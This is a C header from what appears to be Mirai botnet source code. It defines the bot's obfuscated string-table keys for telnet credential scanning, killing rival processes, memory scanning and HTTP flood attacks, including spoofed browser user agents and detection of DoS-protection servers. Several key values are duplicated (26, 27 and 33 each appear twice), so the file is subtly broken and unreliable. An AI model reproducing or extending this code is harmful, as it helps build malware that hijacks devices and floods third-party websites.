#pragma once

#include <stdint.h>
#include "includes.h"

struct table_value
{
    char *val;
    uint16_t val_len;

    #ifdef DEBUG
        BOOL locked;
    #endif
};

#define TABLE_EXEC_SUCCESS 1
#define TABLE_SCAN_SHELL 2
#define TABLE_SCAN_ENABLE 3
#define TABLE_SCAN_SYSTEM 4
#define TABLE_SCAN_SH 5
#define TABLE_SCAN_QUERY 6
#define TABLE_SCAN_RESP 7
#define TABLE_SCAN_NCORRECT 8
#define TABLE_SCAN_ASSWORD 9
#define TABLE_SCAN_OGIN 10
#define TABLE_SCAN_ENTER 11
#define TABLE_SCAN_POST 12
#define TABLE_SCAN_CONTENTLEN 13
#define TABLE_SCAN_CONNECTION 14
#define TABLE_SCAN_ACCEPT 15
#define TABLE_SCAN_AUTH 16
#define TABLE_SCAN_HEADER 17
#define TABLE_SCAN_HEADER2 18
#define TABLE_KILLER_PROC 19
#define TABLE_KILLER_EXE 20 
#define TABLE_KILLER_FD 21
#define TABLE_KILLER_MAPS 22
#define TABLE_KILLER_TCP 23
#define TABLE_MAPS_MIRAI 24
#define TABLE_ATK_VSE 25
#define TABLE_ATK_RESOLVER 26
#define TABLE_ATK_NSERV 27
#define TABLE_MISC_RAND			26
#define TABLE_MISC_DOG			27
#define TABLE_MISC_DOG1			28
#define TABLE_MISC_DOG2			29
#define TABLE_MISC_DOG3			30
#define TABLE_MISC_DOG4			31
#define TABLE_MISC_DOG5			32
#define TABLE_MISC_DOG6			33
#define TABLE_MEM_1 33
#define TABLE_MEM_2 34
#define TABLE_MEM_3 35
#define TABLE_MEM_4 36
#define TABLE_MEM_5 37
#define TABLE_MEM_6 38
#define TABLE_MEM_7 39
#define TABLE_MEM_8 40
#define TABLE_MEM_9 41
#define TABLE_MEM_10 42
#define TABLE_MEM_11 43
#define TABLE_MEM_12 44
#define TABLE_MEM_13 45
#define TABLE_MEM_14 46
#define TABLE_MEM_15 47
#define TABLE_INSTANCE_EXISTS 48
#define TABLE_HTTP_ONE                  49  /* "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36" */
#define TABLE_HTTP_TWO                  50  /* "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36" */
#define TABLE_HTTP_THREE                51  /* "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36" */
#define TABLE_HTTP_FOUR                 52  /* "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36" */
#define TABLE_HTTP_FIVE                 53  /* "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7" */
#define TABLE_ATK_KEEP_ALIVE            54  /* "Connection: keep-alive" */
#define TABLE_ATK_ACCEPT                55  // "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" // */
#define TABLE_ATK_ACCEPT_LNG            56  // "Accept-Language: en-US,en;q=0.8"
#define TABLE_ATK_CONTENT_TYPE          57  // "Content-Type: application/x-www-form-urlencoded"
#define TABLE_ATK_SET_COOKIE            58  // "setCookie('"
#define TABLE_ATK_REFRESH_HDR           59  // "refresh:"
#define TABLE_ATK_LOCATION_HDR          60  // "location:"
#define TABLE_ATK_SET_COOKIE_HDR        61  // "set-cookie:"
#define TABLE_ATK_CONTENT_LENGTH_HDR    62  // "content-length:"
#define TABLE_ATK_TRANSFER_ENCODING_HDR 63  // "transfer-encoding:"
#define TABLE_ATK_CHUNKED               64  // "chunked"
#define TABLE_ATK_KEEP_ALIVE_HDR        65  // "keep-alive"
#define TABLE_ATK_CONNECTION_HDR        66  // "connection:"
#define TABLE_ATK_DOSARREST             67  // "server: dosarrest"
#define TABLE_ATK_CLOUDFLARE_NGINX      68  // "server: cloudflare-nginx"
#define TABLE_ATK_HTTP					69  // "HTTP/1.1"
#define TABLE_ATK_USERAGENT 			70  // "User-Agent:"
#define TABLE_ATK_HOST					71  // "Host:"
#define TABLE_ATK_COOKIE				72  // "Cookie:"
#define TABLE_ATK_SEARCHHTTP			73  // "http"
#define TABLE_ATK_URL                   74  // "url="
#define TABLE_ATK_POST					75  // "POST"

#define TABLE_MAX_KEYS 76

void table_init(void);
void table_unlock_val(uint8_t);
void table_lock_val(uint8_t); 
char *table_retrieve_val(int, int *);

static void add_entry(uint8_t, char *, int);
static void toggle_obf(uint8_t);
